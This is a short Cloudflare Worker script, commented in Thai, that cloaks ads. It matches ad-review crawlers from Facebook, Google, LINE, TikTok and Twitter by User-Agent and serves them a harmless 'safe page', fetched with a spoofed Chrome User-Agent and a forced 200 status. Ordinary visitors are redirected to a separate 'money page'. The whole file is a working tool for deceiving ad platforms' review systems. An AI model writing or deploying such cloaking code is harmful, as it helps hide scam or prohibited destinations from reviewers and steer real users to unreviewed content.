export default {
  async fetch(request, env, ctx) {
    const userAgent = request.headers.get('user-agent') || '';
    
    // รายชื่อบอทตรวจแอดทุกค่าย
    const botPattern = /facebookexternalhit|Facebot|MetaInspector|facebookcatalog|Googlebot|AdsBot-Google|Mediapartners-Google|Google-Adwords|Google-PageRenderer|Line-poker|Linespider|TikTokSpider|ByteSpider|Twitterbot/i;

    const isBot = botPattern.test(userAgent);

    // ปลายทาง
    const safePage = 'https://skipme.link/Friend'; // สำหรับบอท
    const moneyPage = 'https://skipme.link/toweb';   // สำหรับคนจริง

    if (isBot) {
      try {
        // [จุดที่ต้องแก้] ปลอม User-Agent เป็นเบราว์เซอร์ Chrome ปกติ เพื่อไม่ให้โดนปลายทางบล็อก 403
        const response = await fetch(safePage, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
          }
        });

        // ส่งเนื้อหาให้ Facebook บอท พร้อมบังคับ Status 200 ให้ผ่านฉลุย
        return new Response(response.body, {
          status: 200,
          headers: {
            'Content-Type': response.headers.get('content-type') || 'text/html; charset=utf-8'
          }
        });
      } catch (e) {
        return Response.redirect(safePage, 302);
      }
    } else {
      // สำหรับคนจริง: สลับรางไปหน้า Money Page ตามปกติ
      return Response.redirect(moneyPage, 302);
    }
  }
};
